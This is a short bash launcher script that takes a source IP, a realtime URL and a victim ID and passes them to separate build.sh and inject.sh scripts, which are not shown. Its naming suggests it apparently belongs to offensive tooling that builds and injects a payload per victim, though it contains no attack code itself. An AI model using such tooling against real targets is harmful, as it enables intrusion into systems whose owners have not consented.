#!/bin/bash

BASEDIR=$(dirname -- "$(readlink -f -- "${BASH_SOURCE}")")

SOURCEIP=$1
REALTIMEURL=$2
VICTIMID=$3

./build.sh ${REALTIMEURL} ${VICTIMID}
./inject.sh ${SOURCEIP}
